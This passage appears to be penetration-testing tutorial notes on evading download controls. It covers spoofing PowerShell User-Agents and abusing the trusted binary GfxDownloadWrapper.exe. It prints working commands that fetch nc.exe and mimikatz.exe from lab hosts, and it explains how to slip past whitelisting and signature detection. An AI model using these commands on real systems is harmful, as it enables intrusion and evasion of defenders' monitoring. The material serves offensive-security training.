Defenders may monitor or restrict common file transfer techniques such as PowerShell, Netcat, or known User Agents. To bypass these controls, attackers can modify request metadata or leverage trusted system binaries (LOLBins) that are already allowed by application whitelisting.


---

## Changing the User Agent in PowerShell

Security teams may blacklist suspicious or uncommon User Agents. PowerShell’s `Invoke-WebRequest` allows specifying a custom User Agent to mimic legitimate browsers commonly used in enterprise environments, such as Chrome or Firefox.

Using a trusted User Agent can make malicious traffic blend in with normal network activity.


### Listing Available PowerShell User Agents

PowerShell provides predefined User Agent strings through the `PSUserAgent` class.

```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() |
Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} |
Format-List
```

### Downloading a File with a Custom User Agent

Example: Downloading a file while emulating Google Chrome.

```powershell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://10.10.10.32/nc.exe `
  -UserAgent $UserAgent `
  -OutFile "C:\Users\Public\nc.exe"
```


### Server-Side View of the Request

When observed from the listening server, the HTTP request appears to originate from a legitimate browser.

```text
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US)
AppleWebKit/534.6 (KHTML, like Gecko)
Chrome/7.0.500.0 Safari/534.6
Connection: Keep-Alive
```

This helps evade simple signature-based detections.

---

## Evading Application Whitelisting with LOLBAS and GTFOBins

To bypass these controls, attackers can abuse trusted binaries already present on the system, known as **LOLBins** (Living Off The Land Binaries).

### Using LOLBAS on Windows

#### Example: GfxDownloadWrapper.exe

`GfxDownloadWrapper.exe` is part of the Intel Graphics Driver on some Windows systems. It includes functionality to download configuration files and can be abused to download arbitrary executables.

Because it is a trusted binary, it may:

- Bypass application whitelisting
    
- Avoid security alerts
    


```powershell
GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```

This command downloads a remote file and saves it locally without using PowerShell download cmdlets.


### GTFOBins (Linux Equivalent)

GTFOBins is the Linux equivalent of LOLBAS and documents legitimate Unix binaries that can be abused for:

- File upload
    
- File download
    
- Command execution
    
- Privilege escalation
    

At the time of writing, GTFOBins documents nearly 40 commonly installed Linux binaries that support file transfer operations.

When traditional tools are unavailable, checking GTFOBins is a critical step during post-exploitation.
